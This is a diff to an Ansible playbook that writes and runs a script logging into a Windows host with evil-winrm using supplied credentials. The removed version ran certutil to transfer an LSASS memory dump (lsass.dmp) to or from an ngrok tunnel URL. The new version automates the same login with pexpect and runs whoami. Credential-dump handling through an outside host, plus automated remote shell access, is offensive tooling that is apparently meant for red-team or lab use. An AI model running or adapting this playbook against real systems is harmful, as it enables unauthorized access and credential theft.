@@ -1,21 +1,28 @@
 ---
 - name: Create evil-winrm send whomai command
   copy:
-    dest: /opt/winrm.sh
+    dest: /opt/winrm.py
     content: |
-      #!/usr/bin/expect -f
-      set timeout -1
-      spawn evil-winrm -i {{ target_ip }} -u {{ username }} -p {{ password }}
-      expect "PS C:\\Users\\Administrator\\Documents> "
-      send "certutil -urlcache -split -f {{ ngrok_url.stdout }}/lsass.dmp C:\\Windows\\Temp\\exfil_lsass.dmp\r"
-      expect "PS C:\\Users\\Administrator\\Documents> "
-      send "exit\r"
-      interact
+      import pexpect
+
+      target_ip = "{{ target_ip }}"
+      username = "{{ username }}"
+      password = "{{ password }}"
+
+      command = f"evil-winrm -i {target_ip} -u {username} -p {password}"
+
+      child = pexpect.spawn(command)
+      child.timeout = None
+      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
+      child.sendline("whoami.exe")
+      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
+      child.sendline("exit")
+      child.interact()
 
 - name: Make thescript executable
   file:
-    path: /opt/winrm.sh
+    path: /opt/winrm.py
     mode: '0755'
 
 - name: Run the evil-winrm
-  shell: /opt/winrm.sh
+  shell: python3 /opt/winrm.py
